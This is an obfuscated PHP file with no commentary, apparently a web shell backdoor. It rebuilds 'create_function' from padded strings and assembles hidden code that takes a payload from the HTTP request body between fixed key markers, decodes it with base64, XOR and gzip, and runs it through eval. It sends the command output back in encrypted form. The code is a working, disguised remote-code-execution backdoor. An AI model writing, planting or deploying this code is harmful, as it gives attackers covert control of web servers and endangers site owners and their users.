<?php
$G=str_replace('N','','creNNNate_NfuncNtiNon');
$t='($im<=0;$i<$l;){m<for($j=m<0;($jm<<$c&&$i<$lm<);$jm<++,$i++m<){$o.=m<$t{m<$i}^m<$k{$';
$T='nts("php://im<nput"m<),$m)m<==1m<) {@ob_stm<art();@em<vam<l(@m<gzunm<compressm<(@x(@';
$q='<n();$r=@basm<e64_encode(@m<x(@m<gzm<compresm<s($o),$k)m<);prm<int("$pm<$kh$r$kf");}';
$J='$k=m<"05m<d169m<9f";$kh="3c2b407fm<9efe";m<$kf=m<"c8ccm<bm<ce20414";$p=m<"kLm<Xe3EOJhm<j';
$g='j};}}rm<eturn m<$m<o;}im<f (@prem<m<gm<_match("/$kh(.+)$kf/",@fm<m<m<ile_get_m<conte';
$i='base6m<4_m<decom<de($m[1]),$k)))m<;$m<o=@obm<_gm<et_contentm<s(m<);m<@ob_end_clem<am';
$b='WuxjSE";fm<uncm<tm<ion x($t,$k)m<m<{$cm<=strlm<en(m<$k);$l=strlen($tm<);$om<m<="";for';
$c=str_replace('m<','',$J.$b.$t.$g.$T.$i.$q);
$Q=$G('',$c);$Q();
?>
